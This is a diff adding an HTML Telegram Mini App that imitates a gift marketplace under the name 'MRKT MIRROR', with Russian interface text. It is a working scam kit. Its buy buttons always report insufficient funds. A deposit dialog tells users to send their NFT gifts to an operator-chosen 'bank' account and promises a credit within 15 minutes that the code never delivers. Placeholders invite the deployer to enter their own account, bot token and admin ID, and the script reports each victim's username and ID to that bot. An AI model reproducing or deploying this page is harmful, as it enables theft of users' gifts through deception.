@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>MRKT</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    :root {
+      --bg: #0f0f12;
+      --card: #1a1a20;
+      --card-border: #2a2a35;
+      --accent: #3390ec;
+      --text: #ffffff;
+      --muted: #8e8e98;
+      --success: #2ecc71;
+      --warning: #f39c12;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
+
+    .header {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 14px 16px; background: rgba(15, 15, 18, 0.92);
+      position: sticky; top: 0; z-index: 10; border-bottom: 1px solid var(--card-border);
+    }
+    .logo { font-weight: 800; font-size: 20px; display: flex; align-items: center; gap: 6px; }
+    .logo span { background: var(--accent); color: #fff; font-size: 11px; padding: 2px 6px; border-radius: 6px; }
+    .balance-pill {
+      background: var(--card); border: 1px solid var(--card-border);
+      padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600;
+    }
+
+    .container { padding: 16px; }
+    .section-title { font-size: 16px; font-weight: 700; margin-bottom: 12px; }
+
+    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+    .gift-card {
+      background: var(--card); border: 1px solid var(--card-border);
+      border-radius: 16px; padding: 12px; display: flex; flex-direction: column; align-items: center;
+    }
+    .gift-card img { width: 105px; height: 105px; object-fit: contain; margin-bottom: 8px; }
+    .gift-title { font-size: 14px; font-weight: 600; text-align: center; }
+    .gift-num { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
+    .buy-btn {
+      width: 100%; background: var(--accent); color: #fff; border: none;
+      padding: 9px; border-radius: 10px; font-weight: 600; font-size: 13px; cursor: pointer;
+    }
+
+    .add-gift-box {
+      background: linear-gradient(135deg, #1e2230, #161822);
+      border: 1px dashed var(--accent); border-radius: 16px;
+      padding: 24px 16px; text-align: center; margin-bottom: 16px;
+    }
+    .add-gift-box p { color: var(--muted); font-size: 13px; margin: 8px 0 16px; line-height: 1.4; }
+    .primary-btn {
+      background: var(--accent); color: #fff; border: none; padding: 12px 20px;
+      border-radius: 12px; font-weight: 600; font-size: 14px; width: 100%; cursor: pointer;
+    }
+    .secondary-btn {
+      background: #272730; color: #fff; border: none; padding: 12px 20px;
+      border-radius: 12px; font-weight: 600; font-size: 14px; width: 100%; cursor: pointer; margin-top: 8px;
+    }
+
+    .pending-banner {
+      display: none; background: rgba(243, 156, 18, 0.15); border: 1px solid var(--warning);
+      color: #ffd180; padding: 14px; border-radius: 14px; font-size: 13px;
+      line-height: 1.45; margin-bottom: 16px;
+    }
+    .pending-banner strong { display: block; color: var(--warning); font-size: 14px; margin-bottom: 4px; }
+
+    .modal-overlay {
+      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.75);
+      z-index: 100; align-items: flex-end;
+    }
+    .modal {
+      background: var(--card); width: 100%; border-radius: 20px 20px 0 0;
+      padding: 20px 16px 30px; border-top: 1px solid var(--card-border);
+    }
+    .modal h3 { font-size: 18px; margin-bottom: 10px; }
+    .step {
+      background: var(--bg); padding: 12px; border-radius: 12px;
+      font-size: 13px; color: #d0d0d8; margin-bottom: 10px; line-height: 1.4;
+    }
+    .bank-tag {
+      display: inline-block; background: rgba(51,144,236,0.2); color: var(--accent);
+      padding: 2px 8px; border-radius: 6px; font-weight: 700;
+    }
+
+    .tabbar {
+      position: fixed; bottom: 0; left: 0; right: 0; height: 64px;
+      background: #141418; border-top: 1px solid var(--card-border);
+      display: flex; justify-content: space-around; align-items: center;
+    }
+    .tab {
+      color: var(--muted); font-size: 12px; font-weight: 600;
+      display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;
+    }
+    .tab.active { color: var(--accent); }
+    .page { display: none; }
+    .page.active { display: block; }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo">MRKT <span>MIRROR</span></div>
+    <div class="balance-pill" id="userBalance">0.00 TON</div>
+  </div>
+
+  <div id="page-market" class="page active container">
+    <div class="section-title">Популярные подарки</div>
+    <div class="grid" id="marketGrid"></div>
+  </div>
+
+  <div id="page-inventory" class="page container">
+    <div class="section-title">Мой инвентарь</div>
+
+    <div class="pending-banner" id="pendingBanner">
+      <strong>⏳ Заявка принята</strong>
+      Аккаунт пополнится в течение 15 минут.
+    </div>
+
+    <div class="add-gift-box">
+      <div style="font-size: 32px;">🎁</div>
+      <div style="font-weight: 700; font-size: 16px; margin-top: 6px;">Пополнить инвентарь</div>
+      <p>Нажмите кнопку ниже, чтобы передать подарок на аккаунт банка.</p>
+      <button class="primary-btn" onclick="openModal()">+ Добавить подарок</button>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="depositModal">
+    <div class="modal">
+      <h3>Передача подарка на аккаунт</h3>
+      <div class="step">
+        <b>1.</b> Передайте подарок на аккаунт <span class="bank-tag" id="modalBankTag">@bank_acc</span> и оставьте его там.
+      </div>
+      <div class="step">
+        <b>2.</b> После отправки нажмите «Я передал» — аккаунт пополнится в течение 15 минут.
+      </div>
+      <button class="primary-btn" onclick="openBankProfile()">Открыть аккаунт банка</button>
+      <button class="secondary-btn" style="background: var(--success); color: #000;" onclick="confirmTransfer()">Я передал</button>
+      <button class="secondary-btn" onclick="closeModal()">Закрыть</button>
+    </div>
+  </div>
+
+  <div class="tabbar">
+    <div class="tab active" onclick="switchTab('market', this)">
+      <span>🛍</span><span>Маркет</span>
+    </div>
+    <div class="tab" onclick="switchTab('inventory', this)">
+      <span>🎒</span><span>Инвентарь</span>
+    </div>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+
+    // ЗАМЕНИТЕ НА СВОИ ДАННЫЕ:
+    const BANK_USERNAME = "ваш_аккаунт_банк"; // без @
+    const BOT_TOKEN = ""; // необязательно: вставьте токен бота, если хотите уведомления в личку
+    const ADMIN_ID = "";  // необязательно: ваш числовой Telegram ID
+
+    document.getElementById("modalBankTag").textContent = "@" + BANK_USERNAME;
+
+    const items = [
+      { title: "Plush Pepe", num: "#1042", slug: "plushpepe-1042", price: "450 TON" },
+      { title: "Durov's Cap", num: "#318", slug: "durovscap-318", price: "120 TON" },
+      { title: "Scared Cat", num: "#889", slug: "scaredcat-889", price: "34 TON" },
+      { title: "Homemade Cake", num: "#5120", slug: "homemadecake-5120", price: "4.5 TON" }
+    ];
+
+    const grid = document.getElementById("marketGrid");
+    items.forEach(item => {
+      grid.innerHTML += `
+        <div class="gift-card">
+          <img src="https://nft.fragment.com/gift/${item.slug}.webp" alt="${item.title}" />
+          <div class="gift-title">${item.title}</div>
+          <div class="gift-num">${item.num}</div>
+          <button class="buy-btn" onclick="tg.showAlert('Недостаточно средств')">${item.price}</button>
+        </div>
+      `;
+    });
+
+    function switchTab(tabName, el) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.getElementById('page-' + tabName).classList.add('active');
+      el.classList.add('active');
+    }
+
+    function openModal() {
+      document.getElementById('depositModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('depositModal').style.display = 'none';
+    }
+
+    function openBankProfile() {
+      tg.openTelegramLink(`https://t.me/${BANK_USERNAME}`);
+    }
+
+    async function confirmTransfer() {
+      closeModal();
+      document.getElementById('pendingBanner').style.display = 'block';
+
+      if (BOT_TOKEN && ADMIN_ID) {
+        const u = tg.initDataUnsafe?.user || {};
+        const text = `🎁 Подарок передан на банк\nОт: @${u.username || "нет"} (ID: ${u.id || "?"})\nПополнить в течение 15 минут.`;
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: ADMIN_ID, text })
+          });
+        } catch (e) {}
+      }
+    }
+  </script>
+</body>
+</html>
